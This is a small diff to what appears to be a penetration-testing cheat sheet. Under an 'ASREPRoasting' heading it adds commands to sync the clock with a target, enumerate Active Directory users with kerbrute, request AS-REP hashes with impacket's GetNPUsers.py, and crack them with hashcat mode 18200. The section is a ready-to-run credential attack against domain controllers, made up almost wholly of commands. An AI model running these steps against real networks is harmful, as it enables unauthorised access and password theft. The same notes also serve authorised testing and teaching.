@@ -119,11 +119,18 @@ provide password policy.
 ## ASREPRoasting
 
 ```shell
+# Match time with server to get correct ticket
+sudo timedatectl set-ntp off
+sudo rdate -n target_IP
+
 # Using kerbrute
 kerbrute userenum -d $DOMAIN --dc $DC_IP valid_users_list 
 
 # Using impacket toolkit
 GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile valid_ad_users 
+
+# Cracking the password
+hashcat -m 18200 hash wordlist
 ```
 
 
